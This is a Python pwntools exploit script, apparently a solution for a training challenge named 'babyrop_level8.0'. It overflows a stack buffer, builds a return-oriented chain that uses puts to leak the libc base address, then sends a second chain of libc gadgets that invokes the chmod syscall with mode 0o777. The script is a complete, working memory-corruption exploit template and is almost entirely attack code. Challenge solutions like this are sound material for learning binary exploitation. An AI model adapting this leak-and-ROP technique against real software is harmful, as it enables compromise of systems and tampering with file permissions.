from pwn import *
import time

# Init
elf = ELF("/challenge/babyrop_level8.0")
context.arch = "amd64"
context.endian = "little"
io = elf.process()

# Vars
buffer_length = 108 + 4 + 8 # local_78 and variable int 4 byte (local_c) + EBP

# Load the elf of libc
libc = ELF(io.libc.path)
print(io.libc.path)

# Leak the libc base address with double puts
puts_plt = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] This is also valid to call puts
puts_got = elf.got['puts']
challenge_plt = elf.symbols['challenge']
pop_rdi = 0x401dd3

print("Main start: " + hex(challenge_plt))
print("Puts plt: " + hex(puts_plt))
print("pop rdi; ret  gadget: " + hex(pop_rdi))

payload_libc = b"A"*buffer_length + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(challenge_plt)

# First interaction
io.recvuntil("binary by returning to its entrypoint.")
io.sendline(payload_libc)

# Parse leaked address
io.recvuntil("Leaving!\n")
leak = io.recvline()[:-1] + b"\x00"*2
print(len(leak))
leak = int.from_bytes(leak, "little")
print(hex(leak))

# libc base address
libc_address = leak - libc.symbols["puts"]
print(hex(libc_address))
print(hex(libc.symbols["puts"]))

# ROPgadgets from libc for chmod
libc_set_rax_gadget = libc_address + 0x36174
libc_set_rdi_gadget = libc_address + 0x23b6a
libc_set_rsi_gadget = libc_address + 0x2601f
libc_syscall_gadget = libc_address + 0x2284d
string_leaving_address = p64(next(elf.search(b"Leaving!\x00")))

# Payload
payload = b"A"*buffer_length +\
    p64(libc_set_rax_gadget) + p64(0x5A) + p64(libc_set_rdi_gadget) + string_leaving_address + p64(libc_set_rsi_gadget) + p64(0o777) + p64(libc_syscall_gadget)

# Second interaction
io.recvuntil("binary by returning to its entrypoint.")
io.sendline(payload)
io.interactive()